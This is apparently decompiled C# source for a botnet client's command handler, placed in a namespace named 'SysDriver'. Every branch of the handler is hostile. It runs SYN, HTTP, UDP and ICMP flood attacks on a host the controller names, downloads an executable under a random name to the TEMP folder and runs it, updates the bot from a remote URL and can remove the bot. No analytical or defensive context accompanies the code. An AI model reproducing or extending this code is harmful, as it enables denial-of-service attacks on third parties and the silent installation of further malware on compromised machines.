using System;
using System.Diagnostics;
using System.Net;

namespace SysDriver;

internal class cCommandHandler
{
	public void handleCommand(string sCommand)
	{
		string[] array = new string[0];
		WebClient webClient = new WebClient();
		try
		{
			array = sCommand.Split(new char[1] { '*' });
		}
		catch
		{
		}
		switch (array[0])
		{
		case "synflood":
			try
			{
				nSYNFlood.sFHost = Convert.ToString(array[1]);
				nSYNFlood.uPort = ushort.Parse(array[2]);
				nSYNFlood.iThreads = Convert.ToInt32(array[3]);
				nSYNFlood.iSSockets = Convert.ToInt32(array[4]);
				nSYNFlood.StartSYNFlood();
				break;
			}
			catch
			{
				break;
			}
		case "httpflood":
			try
			{
				nHTTPFlood.sFHost = Convert.ToString(array[1]);
				nHTTPFlood.iThreads = Convert.ToInt32(array[2]);
				nHTTPFlood.StartHTTPFlood();
				break;
			}
			catch
			{
				break;
			}
		case "udpflood":
			try
			{
				nUDPFlood.sFHost = Convert.ToString(array[1]);
				nUDPFlood.uPort = ushort.Parse(array[2]);
				nUDPFlood.iThreads = Convert.ToInt32(array[3]);
				nUDPFlood.iUDPSockets = Convert.ToInt32(array[4]);
				nUDPFlood.iPSize = Convert.ToInt32(array[5]);
				nUDPFlood.StartUDPFlood();
				break;
			}
			catch
			{
				break;
			}
		case "icmpflood":
			try
			{
				nICMPFlood.sFHost = Convert.ToString(array[1]);
				nICMPFlood.iThreads = Convert.ToInt32(array[2]);
				nICMPFlood.iICMPSockets = Convert.ToInt32(array[3]);
				nICMPFlood.iPSize = Convert.ToInt32(array[4]);
				nICMPFlood.StartICMPFlood();
				break;
			}
			catch
			{
				break;
			}
		case "download":
			try
			{
				string text2 = cMain.FunctionClass.genString(new Random().Next(5, 12)) + ".exe";
				string text = Convert.ToString(array[1]);
				if (!text.StartsWith("http://"))
				{
					text = "http://" + text;
				}
				webClient.DownloadFile(text, Environment.GetEnvironmentVariable("TEMP") + "\\" + text2);
				Process process = new Process();
				process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\" + text2;
				process.Start();
				break;
			}
			catch
			{
				break;
			}
		case "visit":
			try
			{
				string text = Convert.ToString(array[1]);
				if (!text.StartsWith("http://"))
				{
					text = "http://" + text;
				}
				HTTPRequest(text);
				break;
			}
			catch
			{
				break;
			}
		case "update":
		{
			string text = Convert.ToString(array[1]);
			if (!text.StartsWith("http://"))
			{
				text = "http://" + text;
			}
			cMain.SystemClass.updateBot(text);
			break;
		}
		case "remove":
			if (array[1] == cMain.ConfigClass.sPCName || array[1].ToUpper() == "ALL")
			{
				cMain.SystemClass.RemoveBot();
			}
			break;
		}
	}

	private void HTTPRequest(string URI)
	{
		WebClient webClient = new WebClient();
		webClient.OpenRead(URI);
		webClient.Dispose();
	}
}
